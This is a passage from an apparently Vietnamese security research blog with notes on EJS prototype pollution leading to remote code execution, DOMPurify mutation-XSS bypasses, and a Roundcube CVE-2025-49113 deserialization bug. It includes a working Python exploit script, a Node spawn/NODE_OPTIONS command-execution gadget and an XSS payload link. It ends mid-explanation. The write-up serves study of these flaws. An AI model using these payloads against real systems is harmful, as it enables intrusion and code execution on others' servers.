lower, values set in app.locals, or people who just // want to pass options in their data. NOTE: These values will override // anything previously set in settings or settings[\u0026#39;view options\u0026#39;] utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS); } opts.filename = filename; } else { data = utils.createNullProtoObjWherePossible(); } return tryHandleCache(opts, data, cb); }; H√†m n√†y kh√° t∆∞∆°ng ƒë·ªìng v·ªõi h√†m render b√¨nh th∆∞·ªùng nh∆∞ng s·∫Ω c√≥ v√†i ƒëi·ªÉm ƒë·∫∑c bi·ªát ƒë√≥ l√† :\nviewOpts = data.settings[\u0026#39;view options\u0026#39;]; if (viewOpts) { utils.shallowCopy(opts, viewOpts); } Ta c√≥ th·ªÉ th·∫•y ·ªü ƒë√¢y , data c√≥ th·ªÉ ·∫£nh h∆∞·ªüng tr·ª±c ti·∫øp t·ªõi bi·∫øn opts v√† t·ª´ ƒë√≥ ch·∫≥ng kh√°c g√¨ ta c√≥ th·ªÉ ki·ªÉm so√°t bi·ªÉn opts v√† l·∫•y rce . POC : # server.js :\nconst express = require(\u0026#39;express\u0026#39;); const path = require(\u0026#39;path\u0026#39;); const bodyParser = require(\u0026#39;body-parser\u0026#39;); const app = express(); app.use(bodyParser.json()); // Set EJS as the template engine app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); // Set the views directory app.set(\u0026#39;views\u0026#39;, path.join(__dirname, \u0026#39;views\u0026#39;)); app.post(\u0026#34;/pollute_me\u0026#34;, (req, res) =\u0026gt; { // Prototype pollution vulnerability here const data = { title: \u0026#39;Hello EJS\u0026#39;, message: \u0026#39;Welcome to EJS Template!\u0026#39; } Object.assign(data, req.body); res.render(\u0026#39;index\u0026#39;, data) }) // Define a simple route app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.render(\u0026#39;index\u0026#39;, { title: \u0026#39;Hello EJS\u0026#39;, message: \u0026#39;Welcome to EJS Template!\u0026#39; }); }); // Start the server const PORT = process.env.PORT || 3000; app.listen(PORT, () =\u0026gt; { console.log(`Server running on http://localhost:${PORT}`); }); ex.py :\nimport requests url = \u0026#34;http://localhost:3000\u0026#34; escapeFunction = \u0026#34;JSON.stringify; console.log(1337);let cp = process.mainModule.require(\u0026#39;child_process\u0026#39;);console.log(cp.execSync(\u0026#39;id\u0026#39;).toString());\u0026#34; data = { \u0026#34;settings\u0026#34; : { \u0026#34;view options\u0026#34; : { \u0026#34;client\u0026#34; : \u0026#39;123\u0026#39; , \u0026#34;escapeFunction\u0026#34; : escapeFunction } } } res = requests.post(url+\u0026#39;/pollute_me\u0026#39; ,json=data) print(res.text) requests.get(url) L∆∞u √Ω: gadget tr√™n ch·ªâ ho·∫°t ƒë·ªông khi ki·ªÉm so√°t ƒë∆∞·ª£c property tr·ª±c ti·∫øp c·ªßa data ch·ª© kh√¥ng ph·∫£i proottype pollution v√¨ khi parse renderOptions , n√≥ ch·ªâ copy c√°c own property thui ch·ª© kh√¥ng d√πng lu√¥n c·∫£ objects ƒë·∫•y. var renderOptions = { ...this.locals, ...opts._locals, ...opts }; How it get patched # V√¨ root cause ·ªü ƒë√¢y l√† do h√†m generate Template function nh·∫≠n opts m√† kh√¥ng ki·ªÉm tra kƒ© n√™n patch ƒë∆°n gi·∫£n nh∆∞u sau : https://github.com/mde/ejs/compare/v3.1.9%2e%2e%2ev3.1.10 N√≥ s·∫Ω ki·ªÉm tra c√°c bi·∫øn c√≥ ph·∫£i l√† property tr·ª±c ti·∫øp hay kh√¥ng sau ƒë√≥ tr·∫£ copy v√†o m·ªôt Null Object v√† returns v·ªÅ . Kh√¥ng bi·∫øt c√≥ bypass ƒëc ko :v Nh√¨n chung n·∫øu ta c√≥ th·ªÉ ki·ªÉm so√°t bi·∫øn data (not prototype pollution) th√¨ rce v·∫´n posssible .\nUniversal Gadget # https://portswigger.net/web-security/prototype-pollution/server-side\nNgo√†i ra c√≥ m·ªôt gadget kh√° nguy hi·ªÉm ƒë·ªëi v·ªõi c√°c phi√™n b·∫£n Node js c≈© khi spawn m·ªôt process m·ªõi . function spawn(file, args, options) { const child = new ChildProcess(); options = normalizeSpawnArguments(file, args, options); debug(\u0026#39;spawn\u0026#39;, options); child.spawn(options); return child; } H√†m tr√™n s·∫Ω t·∫°o m·ªôt process v√† truy·ªÅn options ƒë∆∞·ª£c l·∫•y t·ª´ normalizeSpawnArguments V·∫•n ƒë·ªÅ ·ªü ƒë√¢y l√† h√†m tr√™n c√≥ m·ªôt bug v·ªÅ pp .\nconst env = options.env || process.env; const envPairs = []; // Prototype values are intentionally included. for (const key in env) { const value = env[key]; if (value !== undefined) { envPairs.push(`${key}=${value}`); } } return { // Make a shallow copy so we don\u0026#39;t clobber the user\u0026#39;s options object. ...options, args, detached: !!options.detached, envPairs, file, windowsHide: !!options.windowsHide, windowsVerbatimArguments: !!windowsVerbatimArguments }; Nh∆∞ ta ƒë√£ bi·∫øt v√≤ng for in ·ªü ƒë√¢y s·∫Ω loop qua c·∫£ c√°c prototype v√† d∆∞·ªùng nh∆∞ ƒëi·ªÅu n√†y ƒë√£ ƒë∆∞·ª£c c√°c developer intend nh∆∞ng m√† kh√¥ng hi·ªÉu sao l·∫°i intend v n·ªØa : ) V·∫≠y spawn m·ªôt process m·ªõi v√† ki·ªÉm so√°t ƒë∆∞·ª£c options th√¨ ta c√≥ th·ªÉ l√†m ƒë∆∞·ª£c g√¨ ? C√≥ m·ªôt options kh√° th√∫ v·ªã n·∫øu nh∆∞ ta spawn m·ªôt node process . ƒê√≥ l√† NODE_OPTIONS : https://nodejs.org/api/cli.html#node_optionsoptions V√† ta c√≥ th·ªÉ th·∫•y : K·∫øt h·ª£p ƒëi·ªÅu n√†y v·ªõi gadget tr√™n th√¨ ta c√≥ th·ªÉ d·ªÖ d√†ng l·∫•y RCE . V·∫≠y l√†m sao c√≥ th·ªÉ l√†m ƒë∆∞·ª£c khi ta kh√¥ng c√≥ th·ªÉ t·∫°o file ? Ta c√≥ th·ªÉ l·ª£i d·ª•ng c√°c file ƒë·∫∑c bi·ªát nh∆∞ /proc/self/environ nh∆∞ v√≠ d·ª• ·ªü Kibana nh∆∞ng ƒëi·ªÅu n√†y ƒë√£ b·ªã ch·∫∑n v√† kh√¥ng c√≤n kh·∫£ thi v√¨ node js ƒë√£ fixx l·ªói n√†y v√† lu√¥n ƒë·∫∑t environ ·ªü cu·ªëi c√πng. V·∫≠y l√† sao ƒë·ªÉ bypass ? Ta s·∫Ω l·ª£i d·ª•ng m·ªôt file ƒë·∫∑c bi·ªát l√† file /proc/self/cmdline l√† file s·∫Ω tr·∫£ v·ªÅ argv[0] v√≠ d·ª• : const { spawn } = require(\u0026#34;child_process\u0026#34;); const ls = spawn(\u0026#34;node\u0026#34;, [\u0026#34;rce.js\u0026#34;], { env: { ...process.env, // inherit parent env }, stdio: \u0026#34;inherit\u0026#34; // pipe output directly to parent terminal }); rce.js :\nconst fs = require(\u0026#34;fs\u0026#34;); const cmdline = fs.readFileSync(\u0026#34;/proc/self/cmdline\u0026#34;); console.log(cmdline.toString().split(\u0026#34;\\0\u0026#34;)); Khi n√†y ta s·∫Ω th·∫•y argv[0] t∆∞∆°ng ƒë∆∞∆°ng v·ªõi \u0026rsquo;node\u0026rsquo; :\nV√† ƒëi·ªÅu ƒë·∫∑c bi·ªát l√† spawn function c√≥ h·ªó tr·ª£ ch·ª©c nƒÉng set argv[0] m√† kh√¥ng l√†m thay ƒë·ªïi executable file . const { spawn } = require(\u0026#34;child_process\u0026#34;); const ls = spawn(\u0026#34;node\u0026#34;, [\u0026#34;rce.js\u0026#34;], { argv0: \u0026#34;abc\u0026#34;, env: { ...process.env, // inherit parent env }, stdio: \u0026#34;inherit\u0026#34; // pipe output directly to parent terminal }); K·∫øt h·ª£p ƒëi·ªÅu n√†y v·ªõi NODE_OPTIONS v√† /proc/self/cmdline ta c√≥ payload nh∆∞ sau :+1:\nconst { spawn } = require(\u0026#34;child_process\u0026#34;); const ls = spawn(\u0026#34;node\u0026#34;, [\u0026#34;rce.js\u0026#34;], { argv0: \u0026#34;console.log(123);//\u0026#34;, env: { ...process.env, // inherit parent env NODE_OPTIONS: \u0026#34;--require /proc/self/cmdline\u0026#34; }, stdio: \u0026#34;inherit\u0026#34; // pipe output directly to parent terminal }); Cu·ªëi c√πng k·∫øt h·ª£p v·ªõi prototype pollution th√¨ ta s·∫Ω d·ªÖ d√†ng c√≥ ƒë∆∞·ª£c rce . const { spawn } = require(\u0026#34;child_process\u0026#34;); Object.prototype.env = {}; // dummy object Object.prototype.env.NODE_OPTIONS = \u0026#34;--require /proc/self/cmdline\u0026#34;; // trigger loadJ Object.prototype.argv0 = `require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;id \u0026gt; pwn\u0026#34;);//`; spawn(\u0026#34;node\u0026#34;); M·ªôt v√†i ƒëi·ªÉm th√∫ v·ªã v·ªÅ for in : # X√©t v√≠ d·ª• sau :\nscripts = { \u0026#34;pace\u0026#34;: \u0026#34;https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;/main.js\u0026#34;, } Object.prototype.polluted = \u0026#34;WTF\u0026#34; console.log(\u0026#34;Just log it out : \u0026#34;, scripts) for (let script in scripts) { console.log(\u0026#34;[\u0026#34; + script + \u0026#34;] =\u0026gt; \u0026#34; + scripts[script]) } K·∫øt qu·∫£ s·∫Ω c√≥ ch·ª©a polluted kh√¥ng ? C√¢u tr·∫£ l·ªùi l√† c√≥ : ƒê·ªçc t√≠ document v·ªÅ t√≠nh ch·∫•t c·ªßa for in ta c√≥ th·ªÉ th·∫•y r·∫±ng https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Enumerability_and_ownership_of_properties N√≥ s·∫Ω ch·∫•p nh·∫≠n lu√¥n c·∫£ nh·ªØng enumerable l√† inherited t·ª´ Object prototype ! B√†i n√†y m√¨nh th·∫•y ·ªü malta ctf kh√° hay (m·∫∑c d√π m√¨nh k gi·∫£i ra:( )\nSo s√°nh _proto_ v√† constructor.prototype? # Nh∆∞ m·ªçi ng∆∞·ªùi ai c≈©ng bi·∫øt l√† khi l√†m prototype pollution ta th∆∞·ªùng d√πng c√°c key nh∆∞ \u0026ldquo;proto\u0026rdquo; hay \u0026ldquo;constructor.prototype\u0026rdquo; ƒë·ªÉ access ƒë∆∞·ª£c Object.prototype nh∆∞ng v√¨ sao l·∫°i nh∆∞ v·∫≠y ?\nConstructor.prototype : # Ta c√≥ th·ªÉ hi·ªÉu ƒë∆°n gi·∫£n l√† l·∫•y prototype c·ªßa constructor ƒë√≥ . Nh√¨n v√†o ƒëo·∫°n code sau : const a = {} ; T∆∞∆°ng ƒë∆∞∆°ng v·ªõi const a = Object.create(Object.prototype) H√†m Object.create s·∫Ω t·∫°o m·ªôt object v√† s·ª≠ d·ª•ng m·ªôt Object ƒëang t·ªìn t·∫°i l√†m prototype cho ch√∫ng v√† l∆∞u v√†o __proto__ . C√≤n constructor l√† tr·ªè v·ªÅ object v√† l·∫•y prootytpe c·ªßa Object . N√™n v√¥ t√¨nh s·∫Ω khi·∫øn cho __proto__ == Object.prototype __proto__ # S·∫Ω c√≥ c√°c tr∆∞·ªùng h·ª£p __proto__ s·∫Ω kh√°c v·ªõi constructor.prototype nh∆∞ : V√≠ d·ª• tr√™n trang ch√≠nh v·∫≠y. Khi n√†y __proto__ == person. C√≤n constructor c·ªßa n√≥ v·∫´n l√† Object n√™n ƒë∆°n gi·∫£n tr·∫£ v·ªÅ Object prototype C√°c method ƒë·ªÉ l·∫•y Prototype # C√°i n√¨ m√¨nh t√≥m t·∫Øt trick l·ªè l·∫•y ƒë∆∞·ª£c t·ª´ X th√¥i :v https://x.com/arkark_/status/1943260773268230205?s=46 Resource : # https://nodejs.org/api/cli.html#cli_node_options_options https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain#prototype_and_object.getprototypeof https://www.sonarsource.com/blog/blitzjs-prototype-pollution/ https://www.usenix.org/system/files/usenixsecurity23-shcherbakov.pdf https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/\n","date":"20 July 2025","externalUrl":null,"permalink":"/posts/ejs2rce/","section":"Posts","summary":"DEEP DOWN TO EJS # Example usage : # ƒê∆°n gi·∫£n nh∆∞ sau thui : const ejs = require(\u0026#34;ejs\u0026#34;) const template = \u0026#39;\u0026lt;h1\u0026gt;Hello \u0026lt;%= name %\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;; ejs.clearCache(); const data = { name: \u0026#34;12113awefeaw\u0026#34; } const compiled = ejs.render(template, data, {}); console.log(compiled.toString()) How ejs works # Ta c√πng ƒë·ªçc qua v·ªÅ h√†m render :\nexports.render = function (template, d, o) { var data = d || utils.createNullProtoObjWherePossible(); var opts = o || utils.","title":"Some notes on EJS2RCE","type":"posts"},{"content":" DEEP DOWN TO DOMPURIFY # Some note when learning mxss. Source : https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes\nDOWPURFIY WORKFLOWS : # initDocument : D√πng API DOMParser ƒë·ªÉ parse d·ªØ li·ªáu ƒë√∫ng nh∆∞ Browser parse createNodeIterator : D√πng API NodeIterator ƒë·ªÉ iterate qua t·∫•t c·∫£ c√°c node sanitizeElement : Ki·ªÉm tra tag allowed or not _sanitizeShadowDOM : The NodeIterator API doesn\u0026rsquo;t iterate over the template tag by default. Recursively sanitizes when it reaches a DocumentFragment. _sanitizeAttributes : d√πng dom apis ƒë·ªÉ sanitize HTML attributes . Output How MXSS happens : # V·∫≠y th√¨ DOMPurify s·ª≠ d·ª•ng c√πng m·ªôt h·ªá th·ªëng dom parser v·ªõi browser v·∫≠y th√¨ l√†m th·∫ø n√†o m√† MXSS x·∫£y ra . C√≥ m·ªôt v·∫•n ƒë·ªÅ kh√° l·ªõn ƒë√£ ƒë∆∞·ª£c ƒë·ªÅ c·∫≠p trong w3c : Parse m·ªôt html string 2 l·∫ßn c√≥ th·ªÉ d·∫´n ƒë·∫øn nh·ªØng k·∫øt qu·∫£ kh√°c nhau . V√≠ d·ª• : D·ª±a v√†o t√≠nh ch·∫•t kh√¥ng ch·ª©a tag form trong form ta c√≥ th·ªÉ khi·∫øn mutation x·∫£y ra : Note : K·∫øt qu·∫£ domparser ƒë·∫ßu ti√™n l√† th·ª© m√† DOM purify th·∫•y v√† ƒë√£ check xong return v·ªÅ. K·∫øt qu·∫£ th·ª© 2 l√† nh·ªØng g√¨ browser cho ra cu·ªëi c√πng ƒê·ªçc th√™m ·ªü : https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/?utm_source=chatgpt.com Foreign Content # H·∫ßu h·∫øt c√°c element s·∫Ω thu·ªôc HTML namespace nh∆∞ng c≈©ng c√≥ m·ªôt v√†i element nh∆∞ svg v√† math th√¨ svg v√† math s·∫Ω thu·ªôc c√°i namespace kh√°c nhau g·ªçi chung l√† Foreign Content .\nC·ª• th·ªÉ c√≥ s·ª± kh√°c bi·ªát gi·ªØa tag style trong HTML namespace vs SVG namespace . Trong html namespace th√¨ trong style ch·ªâ ch·ª©a text nh∆∞ng trong svg th√¨ ch·ª©a c·∫£ element .Nh∆∞ng kh√¥ng h·∫≥n l√† l√∫c n√†o trong foreign content th√¨ c≈©ng kh√¥ng ch·ª©a HTML namespace , ta s·∫Ω c√≥ m·ªôt v√†i ƒëi·ªÉm ƒë·ªÉ b·∫≠t html g·ªçi l√† intergration point. Ch·ªâ khi token ƒë·∫ßu ti√™n trong mtext l√† mglyph ho·∫∑c malign mark Rules to decide the namespace : # Node Flattening # M·ªôt c√¢u h·ªèi kh√° hay l√† DOM c√≥ th·ªÉ s√¢u t·ªõi bao nhi√™u layers ? Kh√¥ng c√≥ m·ªôt gi·ªõi h·∫°n c·ª• th·ªÉ n√†o n√™n ph·ª• thu·ªôc v√†o th∆∞ vi·ªán\n·ªí v·∫≠y l√† ch√≠nh DOM parser ƒë√£ c√≥ limit l√† 512 nested Node v√† s·∫Ω Flattening ? Ta c√≥ th·ªÉ th·∫•y khi v∆∞·ª£t ng∆∞·ª°ng n√≥ s·∫Ω flat tag nested cu·ªëi c√πng . V√† k·∫øt qu·∫£ sau khi reparse l√† : HTML Parsing State : # Ta s·∫Ω c·∫ßn hi·ªÉu 2 concepts sau :\nInsertion modes Stack of open elements Ta s·∫Ω t·∫≠p trung v√†o insert modes c·ªßa captions in table tag : Ta s·∫Ω th·∫•y n·∫øu nh∆∞ ƒëang trong mode in caption m√† g·∫∑p th√™m m·ªôt tag caption n·ªØa th√¨ s·∫Ω pop stack cho t·ªõi khi caption ƒë∆∞·ª£c pop out ra sau ƒë√≥ chuy·ªÉn v·ªÅ in tables mode . Stack ƒë∆°n gi·∫£n l√† ƒë·ªçc t·ª´ tr√™n xu·ªëng v√† ƒë∆∞a v√†o stack khi l√† start tag v√† pop khi l√† close tag . V·∫≠y what could go wrong. Ta nh√¨n v√†o snippet sau :\n\u0026lt;table\u0026gt; \u0026lt;caption\u0026gt; \u0026lt;div\u0026gt;before\u0026lt;/div\u0026gt; \u0026lt;caption\u0026gt;\u0026lt;/caption\u0026gt; \u0026lt;div\u0026gt;after\u0026lt;/div\u0026gt; \u0026lt;/caption\u0026gt; \u0026lt;/table\u0026gt; Khi parser ƒë·ªçc ƒë·∫øn caption tag ƒë·∫ßu ti√™n n√≥ s·∫Ω ƒë∆∞·ª£c v√†o stack v√† khi ch·∫°m ph·∫£i open tag caption ti·∫øp theo n√≥ s·∫Ω b·∫Øt ƒë·∫ßu close tag cho ƒë·∫øn khi caption ƒë√£ ƒë∆∞·ª£c pop out kh·ªèi tag v√† switch sang intable mode d·∫´n ƒë·∫øn vi·ªác tr√™n stack kh√¥ng t·ªìn t·∫°i caption n·ªØa v√† tag \u0026lt;/caption\u0026gt; c≈©ng v√¥ nghƒ©a =\u0026gt; div after s·∫Ω b·ªã chuy·ªÉn v·ªÅ intable modes nh∆∞ng v√¨ divs c≈©ng kh√¥ng h·ª£p l·ªá trong tables d·∫´n ƒë·∫øn b·ªã pop out ra v√† cho k·∫øt qu·∫£ nh∆∞ sau : Nh∆∞ng c√≥ m·ªôt v·∫•n ƒë·ªÅ cu·ªëi c√πng l√† caption kh√¥ng th·ªÉ ƒë∆∞·ª£c nest nh∆∞ trong snippet th·∫ø n√™n ƒë·ªÉ bypass c√°i n√†y th√¨ ta s·∫Ω l·ª£i d·ª•ng Node Flattening v√† k·∫øt qu·∫£ l√† : Ta ƒë√£ c√≥ caption nested in caption v√† mxss go here\nFinal payload : https://yeswehack.github.io/Dom-Explorer/frame?input=editable\u0026amp;titleBar=readonly\u0026amp;readonly=true\u0026amp;pipe[titleBar]=true\u0026amp;pipe[settings]=true\u0026amp;pipe[render]=true\u0026amp;pipe[skip]=true/#eyJpbnB1dCI6IjxkaXYqNTA2PlxuPHRhYmxlPlxuICA8Y2FwdGlvbj5cbiAgICA8c3ZnPlxuICAgICAgPHRpdGxlPlxuICAgICAgICA8dGFibGU+PGNhcHRpb24+PC9jYXB0aW9uPjwvdGFibGU+XG4gICAgICA8L3RpdGxlPlxuICAgICAgPHN0eWxlPjxhIGlkPVwiPC9zdHlsZT48aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoKT5cIj48L2E+PC9zdHlsZT5cbiAgICA8L3N2Zz5cbiAgPC9jYXB0aW9uPlxuPC90YWJsZT4iLCJwaXBlbGluZXMiOlt7ImlkIjoiMGFkcXN1YWoiLCJuYW1lIjoiRG9tIFRyZWUiLCJwaXBlcyI6W3sibmFtZSI6IkRvbVB1cmlmeSIsImlkIjoiZXJsNXR6ZXMiLCJoaWRlIjp0cnVlLCJza2lwIjpmYWxzZSwib3B0cyI6eyJ2ZXJzaW9uIjoiMy4xLjAiLCJvcHRpb25zIjoie30ifX0seyJuYW1lIjoiRG9tUGFyc2VyIiwiaWQiOiJiNTRyd2RiNSIsImhpZGUiOmZhbHNlLCJza2lwIjpmYWxzZSwib3B0cyI6eyJ0eXBlIjoidGV4dC9odG1sIiwic2VsZWN0b3IiOiJib2R5Iiwib3V0cHV0IjoiaW5uZXJIVE1MIiwiYWRkRG9jdHlwZSI6dHJ1ZX19XX1dfQ== BUMP ELEMENT # C√ÅI G√å ƒêANG X·∫¢Y RA ·ªû ƒê√ÇY V ? : C√πng ƒë·ªçc docs nh√© https://html.spec.whatwg.org/multipage/parsing.html#parsing-main-intable\nC√≥ v·∫ª l√† do\u0026lt;/form\u0026gt; n√™n m·ªõi bug ·ªü ƒë√¢y X√≥a start form th√¨ v·∫´n ƒÉn =)) v·∫≠y t·ª©c l√† do th·∫±ng cu \u0026lt;/form\u0026gt; m·∫π r√≤i\nVi \u0026lt;/form\u0026gt; la invalid tag s·∫Ω fallback v·ªÅ foster parenting C∆° ch·∫ø foster parenting # Trong HTML parsing, foster parenting l√† m·ªôt c∆° ch·∫ø ƒë·∫∑c bi·ªát ƒë∆∞·ª£c quy ƒë·ªãnh trong HTML parsing algorithm ƒë·ªÉ x·ª≠ l√Ω m·ªôt s·ªë tr∆∞·ªùng h·ª£p kh√¥ng h·ª£p l·ªá (misnested), c·ª• th·ªÉ l√† khi b·∫°n ch√®n c√°c th·∫ª kh√¥ng h·ª£p l·ªá v√†o gi·ªØa c√°c th·∫ª nh∆∞ \u0026lt;table\u0026gt;, \u0026lt;tbody\u0026gt;, \u0026lt;tr\u0026gt;, v.v.\nV√≠ d·ª• tr∆∞·ªùng h·ª£p l√† tag h1 Th√¨ s·∫Ω ƒë∆∞·ª£c ƒë·∫©y v√†o form , v√¨ form kh√¥ng th·ªÉ ch·ª©a \u0026lt;form\u0026gt; nh∆∞ ta ƒë√£ bi·∫øt nh∆∞ng c√≤n **\u0026lt;/form\u0026gt;** th√¨ sao ? Khi nh·∫£y ra ngo√†i form n√≥ c≈©ng kh√¥ng valid n√™n n√≥ nh·∫£y ra t·ªõi tag body v√† v√¨ th·∫ø √¥m lu√¥n th·∫±ng div ?? Sau m·ªôt h·ªìi test th√¨ c√≥ v·∫ª kh√¥ng ph·∫£i nh∆∞ v·∫≠y. V·∫≠y nguy√™n nh√¢n l√† do ƒë√¢u m√† BUMP ho·∫°t ƒë·ªông ?\nFinal : # Sau m·ªôt h·ªìi ƒë·ªçc docx th√¨ m√¨nh c≈©ng nh·∫≠n ra ƒëi·ªÅu sau : Ta th·∫•y khi g·∫∑p \u0026lt;/form\u0026gt; s·∫Ω c√≥ nh·ªØng action sau, ƒë·∫∑c bi·ªát l√† 2. v√† 3. khi k·∫øt h·ª£p l·∫°i c√≥ th·ªÉ x√≥a ƒëi m·ªôt form element pointer nh∆∞ng v·∫´n kh√¥ng x√≥a node ƒë√≥ kh·ªèi stack ƒêi·ªÅu ki·ªán s·ªë 3 s·∫Ω ki·ªÉm tra c√≥ node trong scope hay kh√¥ng ? Th·∫ø nghƒ©a l√† sao ? Ta nh√¨n v√†o ƒëo·∫°n sau : Hi·ªÉu ƒë∆°n gi·∫£n l√† : M·ªôt ph·∫ßn t·ª≠ ƒë∆∞·ª£c coi l√† \u0026ldquo;in scope\u0026rdquo; n·∫øu n√≥ n·∫±m tr√™n stack, v√† kh√¥ng b·ªã \u0026ldquo;che m·∫•t\u0026rdquo; b·ªüi c√°c ph·∫ßn t·ª≠ ƒë·∫∑c bi·ªát kh√°c nh∆∞ table, select, template, etc.\nKhi ƒë∆∞·ª£c foster parenting stack hi·ªán l√† : [body , form , table ] v·ªõi table l√† blocking tag n√™n khi trigger \u0026lt;/form\u0026gt; s·∫Ω trigger tr∆∞·ªùng h·ª£p th·ª© ba nh∆∞ng ƒë·ªìng th·ªùi set form element v·ªÅ null d·∫´n ƒë·∫øn \u0026lt;/form\u0026gt; cu·ªëi c√πng kh√¥ng ƒë√≥ng form n√†y l·∫°i ƒë∆∞·ª£c . v√† form v·∫´n n·∫±m tr√™n stack v√† nh·∫≠n children =)))) =\u0026gt; \u0026lt;/form\u0026gt; ƒë√£ b·ªã ch·∫∑n b·ªüi tag table\nT·ªïng k·∫øt flow nh∆∞ sau : D·ª±a tr√™n ƒëi·ªÅu ƒë√≥ ta c√≥ th·ªÉ thay th·∫ø blocking scope tag v√† c√≥ c√πng effect : ","date":"10 July 2025","externalUrl":null,"permalink":"/posts/dompurify/","section":"Posts","summary":"DEEP DOWN TO DOMPURIFY # Some note when learning mxss. Source : https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes\nDOWPURFIY WORKFLOWS : # initDocument : D√πng API DOMParser ƒë·ªÉ parse d·ªØ li·ªáu ƒë√∫ng nh∆∞ Browser parse createNodeIterator : D√πng API NodeIterator ƒë·ªÉ iterate qua t·∫•t c·∫£ c√°c node sanitizeElement : Ki·ªÉm tra tag allowed or not _sanitizeShadowDOM : The NodeIterator API doesn\u0026rsquo;t iterate over the template tag by default. Recursively sanitizes when it reaches a DocumentFragment.","title":"Some notes on DomPurify","type":"posts"},{"content":" Rebuild CVE-2025-49113 # Source : https://fearsoff.org/research/roundcube\nRoot cause : # Bug at custom unserialization Sink In Secure Deserialization at Pear Crypt package. Introduction: # Roundcub is a free and open source webmail software for the masses, written in PHP. How roundcube handle session ? # It will serialize of data and then base64 encode then store into MYSQL at table session with columns vars. It sound simple right ? But the problem when you try to decode that base64 is : Well you can see that its use a weird structure when comparing to the normal . For example , with this data :\n$data = [ \u0026#39;injected\u0026#39; =\u0026gt; [ \u0026#34;aaa\u0026#34; =\u0026gt;\u0026#34;b\u0026#34;, \u0026#34;cccc\u0026#34; =\u0026gt;\u0026#34;d\u0026#34; ], \u0026#39;injected2\u0026#39; =\u0026gt; \u0026#39;PWNED2\u0026#39;, ]; **The result will be : **\nNormal : a:2:{s:8:\u0026#34;injected\u0026#34;;a:2:{s:3:\u0026#34;aaa\u0026#34;;s:1:\u0026#34;b\u0026#34;;s:4:\u0026#34;cccc\u0026#34;;s:1:\u0026#34;d\u0026#34;;}s:9:\u0026#34;injected2\u0026#34;;s:6:\u0026#34;PWNED2\u0026#34;;} Custom : injected|a:2:{s:3:\u0026#34;aaa\u0026#34;;s:1:\u0026#34;b\u0026#34;;s:4:\u0026#34;cccc\u0026#34;;s:1:\u0026#34;d\u0026#34;;}injected2|s:6:\u0026#34;PWNED2\u0026#34;; So its store data something like (When writing this, i dont know that there\u0026rsquo;s many kinds of serializing and this is the \u0026lsquo;php\u0026rsquo; one , the others are php-binary , php-serialize\u0026hellip;.) : \u0026lt;KEY OBJECT\u0026gt;|\u0026lt;SERIALIZED DATA\u0026gt; The custom one is implemented :\nShow Implementation Code function myUnserialize($str) { $str = (string) $str; $endptr = strlen($str); $p = 0; $serialized = \u0026#39;\u0026#39;; $items = 0; $level = 0; while ($p \u0026lt; $endptr) { $q = $p; while ($str[$q] != \u0026#39;|\u0026#39;) { if (++$q \u0026gt;= $endptr) { break 2; } } // $q after the while q = index of \u0026#34;|\u0026#34; // $p = current index if ($str[$p] == \u0026#39;!\u0026#39;) { $p++; $has_value = false; //THis lead to the username not have value and the left will be put into check } else { $has_value = true; } $name = substr($str, $p, $q - $p); $q++; $serialized .= \u0026#39;s:\u0026#39; . strlen($name) . \u0026#39;:\u0026#34;\u0026#39; . $name . \u0026#39;\u0026#34;;\u0026#39;; if ($has_value) { while (true) { $p = $q; switch (strtolower($str[$q])) { case \u0026#39;n\u0026#39;: // null case \u0026#39;b\u0026#39;: // boolean case \u0026#39;i\u0026#39;: // integer case \u0026#39;d\u0026#39;: // decimal do { $q++; } while (($q \u0026lt; $endptr) \u0026amp;\u0026amp; ($str[$q] != \u0026#39;;\u0026#39;)); $q++; $serialized .= substr($str, $p, $q - $p); if ($level == 0) { break 2; } break; case \u0026#39;r\u0026#39;: // reference $q += 2; $id = \u0026#39;\u0026#39;; for (; ($q \u0026lt; $endptr) \u0026amp;\u0026amp; ($str[$q] != \u0026#39;;\u0026#39;); $q++) { $id .= $str[$q]; } $q++; // increment pointer because of outer array $serialized .= \u0026#39;R:\u0026#39; . (intval($id) + 1) . \u0026#39;;\u0026#39;; if ($level == 0) { break 2; } break; case \u0026#39;s\u0026#39;: // string $q += 2; $length = \u0026#39;\u0026#39;; for (; ($q \u0026lt; $endptr) \u0026amp;\u0026amp; ($str[$q] != \u0026#39;:\u0026#39;); $q++) { $length .= $str[$q]; } $q += 2; $q += (int) $length + 2; $serialized .= substr($str, $p, $q - $p); if ($level == 0) { break 2; } break; case \u0026#39;a\u0026#39;: // array case \u0026#39;o\u0026#39;: // object do { $q++; } while ($q \u0026lt; $endptr \u0026amp;\u0026amp; $str[$q] != \u0026#39;{\u0026#39;); $q++; $level++; $serialized .= substr($str, $p, $q - $p); break; case \u0026#39;}\u0026#39;: // end of array|object $q++; $serialized .= substr($str, $p, $q - $p); if (--$level == 0) { break 2; } break; default: return false; } } } else { $serialized .= \u0026#39;N;\u0026#39;; $q += 2; } $items++; $p = $q; } return unserialize(\u0026#39;a:\u0026#39; . $items . \u0026#39;:{\u0026#39; . $serialized . \u0026#39;}\u0026#39;); } I created a graph to explain the flow of this : So in short if your key have the \u0026ldquo;!\u0026rdquo; at first this will result in : $data = [ \u0026#39;!injected\u0026#39; =\u0026gt; [ \u0026#34;aaa\u0026#34; =\u0026gt;\u0026#34;b\u0026#34;, \u0026#34;cccc\u0026#34; =\u0026gt;\u0026#34;d\u0026#34; ], \u0026#39;injected2\u0026#39; =\u0026gt; \u0026#39;PWNED2\u0026#39;, ]; You can see the injected key is value = None. It start to read right after the first \u0026ldquo;|\u0026rdquo; and it find the next \u0026ldquo;|\u0026rdquo; and set the new key = everything before \u0026ldquo;|\u0026rdquo; \u0026hellip;. ==This lead to SESSION CORRUPTION. ==\nSo how can we abuse this ? # The current problem is we cannot handle 